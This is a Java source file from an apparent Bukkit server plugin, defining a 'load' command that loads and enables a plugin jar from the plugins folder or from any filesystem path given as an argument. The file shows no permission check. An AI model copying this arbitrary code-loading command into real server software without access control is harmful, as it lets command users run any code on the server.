package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.InvalidDescriptionException;
import org.bukkit.plugin.InvalidPluginException;

import java.io.File;

public class Load implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"load"};
    }

    @Override
    public String getDescription() {
        return "Load a plugin from the plugins folder or another directory.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "load <plugin.jar | ./directory/file.jar>");
            return;
        }

        File file = null;
        boolean isError = false;

        try {
            file = new File("./plugins/" + String.join(" ", args));
        } catch (Exception ignored) {
            isError = true;
        }

        if (file == null) {
            isError = true;
        } else {
            if (!file.exists()) {
                isError = true;
            }
        }

        if (isError) {
            try {
                file = new File(String.join(" ", args));
                if(!file.exists()) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + "That file was not found!");
                    return;
                }
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }
        }

        if(file.isDirectory()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That's a directory.");
            return;
        }

        try {
            Utilities.loadPlugin(context.getZ_(), file);
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully enabled plugin  " + file.getPath() + "!");
        } catch (InvalidPluginException | InvalidDescriptionException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }
    }
}
